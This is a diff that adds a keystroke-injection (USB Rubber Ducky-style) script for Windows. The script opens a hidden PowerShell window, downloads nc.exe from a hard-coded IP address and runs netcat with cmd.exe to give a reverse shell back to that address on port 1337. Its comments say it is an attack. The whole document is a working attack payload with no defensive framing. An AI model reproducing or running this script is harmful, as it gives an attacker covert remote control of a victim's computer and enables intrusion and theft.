@@ -1,0 +1,24 @@
+REM begin a nc reverse shell, must be ready to catch shell at all times
+DELAY 1000
+GUI r
+DELAY 100
+STRING powershell
+ENTER
+DELAY 11000
+REM obfuscate the command prompt
+STRING powershell.exe -windowstyle hidden
+ENTER
+DELAY 500
+REM begin downloading nc.exe
+STRING $c = new-object System.Net.WebClient
+ENTER
+DELAY 100
+STRING $c.DownloadFile("http://185.207.205.144/nc.exe",".\Downloads\nc.exe")
+ENTER
+DELAY 220
+REM done with that
+REM execute nc.exe with a reverse shell pointed at myself
+REM reverse shell must be listening first dipshit
+STRING ./Downloads/nc.exe -e C:\Windows\System32\cmd.exe 185.207.205.144 1337
+ENTER
+REM thats all folks
